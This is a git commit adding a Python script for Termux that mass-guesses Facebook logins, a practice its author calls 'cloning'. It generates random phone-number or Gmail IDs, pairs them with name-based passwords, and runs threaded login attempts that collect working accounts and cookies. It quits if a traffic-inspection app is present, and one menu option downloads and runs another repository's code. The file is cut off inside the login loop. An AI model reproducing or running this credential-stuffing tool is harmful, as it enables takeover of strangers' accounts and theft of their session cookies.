22e0e2c5f66ff6eb11429f1148ee3d3e1bb90595
Eshan2544 <124605987+Eshan2544@users.noreply.github.com>
2023-02-13 17:29:31 +0600

    Add files via upload

---
+++ Eshan2.py
@@ -0,0 +1,290 @@
+ ####@-----Import-----@####
+import os,base64
+
+os.system('git pull -q;rm .rndm')
+try:
+	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
+	from string import *
+	from concurrent.futures import ThreadPoolExecutor as ThreadPool
+except(ImportError):
+    os.system("pip install requests")
+    pass
+
+
+try:
+    import bs4
+except(ImportError):
+    os.system("pip install bs4")
+    pass
+
+try:
+	a = "anar"
+	t="tt"
+	fileee = os.listdir('/sdcard/Android/data/')
+	if f'com.h{t}pc{a}y.pro' in fileee:
+		print('Delete Http Canary');sys.exit()
+except:pass
+
+lm = '/data/data/com.termux/files/usr/lib/python3.11'
+if not 'print' in open(lm+'/site-packages/requests/sessions.py','r').read():
+	pass
+else:sys.exit()
+
+import subprocess
+from bs4 import BeautifulSoup
+import json,os,time,base64,random,re,sys, subprocess 
+from requests.exceptions import ConnectionError as CError
+from concurrent.futures import ThreadPoolExecutor as speed
+
+accounts = []
+loop = 0
+
+
+####DESIGN####
+def oo(t):
+	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '
+
+###USERAGENTSGEN####
+fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
+
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+andd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+carr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+
+device = {
+        'android_version':android_version,
+        'model':model,
+        'build':build,
+         'cr':carr,
+         'brand':andd}
+
+ua = []
+
+import requests
+rs = requests.get
+ua = []
+
+del ua
+"""
+Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
+"""
+
+ua=[]
+
+##Logo##
+P = '\x1b[1;97m'
+G='\x1b[1;92m'
+R='\x1b[1;91m'
+S ='\x1b[1;96m'
+Y ='\x1b[1;93m'
+uu ='\x1b[1;95m'
+tred = speed
+
+	
+logo= f'''
+{G}  ¦¦¦¦¦¦¦        ¦¦    ¦¦  
+{R}  ¦¦             ¦¦    ¦¦
+{Y}  ¦¦¦¦¦¦¦        ¦¦¦¦¦¦¦¦ 
+{S}  ¦¦             ¦¦    ¦¦
+{uu} ¦¦¦¦¦¦¦  ¦¦    ¦¦    ¦¦
+\033[1;93m=================================
+\033[1;97m Owner  : Eshan Sheikh :/
+\033[1;97m GitHub : Eshan2544 :/
+\033[1;97m Version:\033[1;92m 0.8 \033[1;97m:/
+\033[1;97m Status : Free :/
+\033[1;97m Notice : Use 10007/10006 For More OK Ids :/
+\033[1;93m=================================
+'''
+
+####@-----Menu-----@####
+def Hxw_Main():
+    os.system("clear")
+    print(logo)
+    print(f"{oo(1)}File Cloning")
+    print(f"{oo(2)}Pak Random Cloning")
+    print(f"{oo(3)}Gmail Cloning")  
+    print(f"{oo(4)}Create File")
+    print(f"{oo(0)}Exit")
+    inpp = input(f"{oo('?')}Your Choice : ")
+    if inpp == "1":
+        file()
+    if inpp == '2':pak()
+    if inpp =='3':
+        gmail()
+    if inpp == "4":
+     print(f'{oo("+")}Loading Best File Create Command ')
+     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
+     os.system('cd && cd FILE ;python FILE.py')
+     exit()
+    if inpp == "0":
+     exit('Exit!')
+     
+     
+l = []
+
+####@-----File-----@####
+def file():
+    os.system("clear")
+    print(logo)
+    if 'gm' in l:
+        file = '.Hannan'
+    else:
+        file = input(f"{oo('-')}Enter File: ")
+    try:
+        for x in open(file,'r').readlines():
+            accounts.append(x.strip())
+    except:
+        print(f"{oo('!')}File Not Found");time.sleep(1)
+        Hxw_Main()
+     
+    method()
+    exit()
+    
+            
+   
+####@-----AppCheck-----@####
+def check(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+    	pass
+    else:
+        for gm in game:
+            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        pass
+    else:
+        for gm in game:
+            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))
+
+
+####@-----Gmail-----@####
+
+def gmail():     
+        os.system('rm -rf .Hannan')
+        first = input(f'{oo("?")}Put First Name: ')
+        last = input(f'{oo("?")}Put Last Name: ')
+        domain = input(f'{oo("?")}Put Domain: ')
+        try:
+            limit = input(f'{oo("?")}Put Limit: ')
+        except ValueError:
+            limit = 5000
+        lists = ['3','4']
+        for xd in range(int(limit)):
+            lchoice = random.choice(lists)
+            if '3' in lchoice:
+                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+            else:
+                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+            fo = open('.Hannan', 'r').read().splitlines()
+        with tred(max_workers=30) as king___xd:
+            tl = str(len(fo))
+            tk = first+last
+            l.append('gm')
+            file()
+
+       
+        
+####@-----PakNumber-----@####
+
+
+def pak():
+	user=[]
+	code = input(f'{oo("!")}Put Code : ')
+	try:
+		limit = int(input(f'{oo("?")}Put Limit :  '))
+	except ValueError:
+		limit = 5000
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	for psx in user:
+		ids = code+psx
+		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
+	andom()
+
+
+
+####@-----UserAgent----@####
+"""
+Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
+Mozilla/5.0 (Linux; Android 13; V2169 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
+Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 11; itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
+Mozilla/5.0 (Linux; Android 12; 22041219C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 12; TECNO KH6 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]
+Mozilla/5.0 (Linux; Android 11; MP02 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 12; CPH2457 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 11; T781SPP Build/RKQ1.210614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 10; Z555 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]
+Mozilla/5.0 (Linux; Android 8.0.0; CUBOT_P20 Build/O00623; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]
+Mozilla/5.0 (Linux; Android 10; EVE-LX9N Build/HUAWEIEVE-LX9N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0.0.14.108;]
+Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 11; Armor 12 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]
+Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]
+Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+
+"""
+####@-----FileM-----@####
+
+
+def method():
+    okacc = []
+    cpacc = []
+    totalpass = []
+    os.system("clear")
+    print(logo)
+    if 'o':      
+        lp = input(f'{oo("?")}Total Password? : ')
+        if lp.isnumeric():
+            ex = 'firstlast first123 last123'
+            print(f'{oo("+")}{ex} (ETC)')
+            for x in range(int(lp)):
+                totalpass.append(input(f'{oo(x+1)}Password : '))
+            pass
+        else:
+            print(f"{oo('!')}Numeric Only")
+            exit()
+    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
+    m=input(f"{oo('!')}Input : ") 
+    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
+    cpok=input(f"{oo('!')}Input : ")
+    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
+    c=input(f"{oo('!')}Input : ")
+    apps='y'
+    os.system("clear")
+    print(logo) 
+    print('\033[1;93m='*25)
+    print(f'{oo("?")}Total Ids : \033[1;92m'+str(len(accounts)))
+    print(f"{oo('-')}Wait As You Can :)")
+    print(f"{oo('•')}/sdcard/Eshan2544-OK.txt")
+    print('\033[1;93m='*25)
+    print()
+    
+    def start(user):
+     try:
+        global loop,accounts
+        r = requests.Session()
+        user = user.strip()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+           last = first
+        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
+        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str
